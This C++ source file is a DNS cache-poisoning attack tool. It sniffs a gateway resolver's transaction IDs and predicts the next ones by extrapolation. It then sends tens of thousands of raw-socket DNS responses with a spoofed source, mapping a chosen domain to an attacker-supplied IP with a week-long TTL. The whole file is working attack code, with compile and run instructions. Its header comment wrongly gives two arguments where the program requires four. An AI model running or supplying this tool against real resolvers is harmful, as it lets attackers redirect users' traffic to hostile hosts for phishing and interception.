// Compile: g++ -o id_predict id_predict.cpp -lpthread
// Run: sudo ./id_predict <target_dns> <gateway_dns>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <random>
#include <cmath>

class IDPredictionAttack {
private:
    std::string targetDNS, gatewayDNS;
    std::vector<uint16_t> observedIDs;
    
    // Linear congruential generator parameters
    // Many DNS servers use LCG or similar for ID generation
    uint32_t lcg_a = 1103515245;
    uint32_t lcg_c = 12345;
    uint32_t lcg_m = 0x10000;
    
public:
    IDPredictionAttack(const std::string& dns, const std::string& gateway)
        : targetDNS(dns), gatewayDNS(gateway) {}
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
    // Observe TXIDs from gateway's queries (via sniffing)
    void observeQueryIDs(int count) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock < 0) return;
        
        char buffer[4096];
        struct sockaddr_in from;
        socklen_t fromLen = sizeof(from);
        
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        std::cout << "[*] Observing " << count << " TXIDs from gateway...\n";
        
        for (int i = 0; i < count; i++) {
            int bytes = recvfrom(sock, buffer, sizeof(buffer), 0,
                                 (struct sockaddr*)&from, &fromLen);
            if (bytes < 12) continue;
            
            // Extract IP header (variable length)
            struct iphdr* ip = (struct iphdr*)buffer;
            int ipHeaderLen = ip->ihl * 4;
            
            // Only DNS UDP traffic from gateway
            if (ip->protocol != IPPROTO_UDP) continue;
            if (ip->saddr != inet_addr(gatewayDNS.c_str())) continue;
            
            struct udphdr* udp = (struct udphdr*)(buffer + ipHeaderLen);
            if (ntohs(udp->dest) != 53) continue;
            
            // DNS header starts after UDP
            char* dns = buffer + ipHeaderLen + sizeof(struct udphdr);
            
            // Query only (QR=0)
            uint16_t flags = ntohs(*(uint16_t*)(dns + 2));
            if (flags & 0x8000) continue;
            
            uint16_t txid = ntohs(*(uint16_t*)(dns + 0));
            observedIDs.push_back(txid);
        }
        
        close(sock);
    }
    
    // Analyze observed TXIDs for patterns
    // Many DNS servers use LCG, random() with predictible seed, or Unix timestamp
    void analyzeIDs() {
        std::cout << "[*] Analyzing " << observedIDs.size() << " TXIDs\n";
        
        if (observedIDs.size() < 2) return;
        
        // Calculate differences
        std::vector<int32_t> diffs;
        for (size_t i = 1; i < observedIDs.size(); i++) {
            int32_t diff = (int32_t)observedIDs[i] - (int32_t)observedIDs[i-1];
            diffs.push_back(diff);
        }
        
        // Statistical analysis
        double mean = 0;
        for (int32_t d : diffs) mean += d;
        mean /= diffs.size();
        
        double variance = 0;
        for (int32_t d : diffs) variance += (d - mean) * (d - mean);
        variance /= diffs.size();
        double stddev = sqrt(variance);
        
        std::cout << "[*] Mean diff: " << mean << ", StdDev: " << stddev << "\n";
        
        // Check for LCG pattern
        if (stddev < 100) {
            std::cout << "[!] Low variance - ID generation is predictable!\n";
        }
        
        // Check if Unix timestamp based
        time_t now = time(NULL);
        for (size_t i = 0; i < observedIDs.size(); i++) {
            if (abs((int)observedIDs[i] - (int)now) < 60) {
                std::cout << "[!] TXID appears Unix timestamp based!\n";
                break;
            }
        }
    }
    
    // Predict next TXIDs based on observed pattern
    std::vector<uint16_t> predictIDs(int count) {
        std::vector<uint16_t> predictions;
        
        if (observedIDs.size() < 2) {
            // Fallback: random guesses
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, 65535);
            for (int i = 0; i < count; i++) predictions.push_back(dis(gen));
            return predictions;
        }
        
        // Linear extrapolation
        int32_t lastDiff = (int32_t)observedIDs.back() - (int32_t)observedIDs[observedIDs.size()-2];
        uint16_t last = observedIDs.back();
        
        for (int i = 0; i < count; i++) {
            int32_t next = (int32_t)last + lastDiff * (i + 1);
            predictions.push_back((uint16_t)(next & 0xFFFF));
        }
        
        return predictions;
    }
    
    void sendPoisonedResponse(uint16_t txid, uint16_t dstPort, 
                              const std::string& domain,
                              const std::string& spoofIP) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);
        
        int pos = 12;
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr addr;
        inet_aton(spoofIP.c_str(), &addr);
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(gatewayDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(gatewayDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(const std::string& domain, const std::string& spoofIP) {
        // Phase 1: observe
        observeQueryIDs(1000);
        analyzeIDs();
        
        // Phase 2: predict and poison
        auto predictions = predictIDs(50000);
        std::cout << "[*] Sending " << predictions.size() 
                  << " predicted responses\n";
        
        for (uint16_t id : predictions) {
            uint16_t port = 1024 + (rand() % 64000);
            sendPoisonedResponse(id, port, domain, spoofIP);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_dns> <gateway_dns> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    IDPredictionAttack attack(argv[1], argv[2]);
    attack.run(argv[3], argv[4]);
    return 0;
}
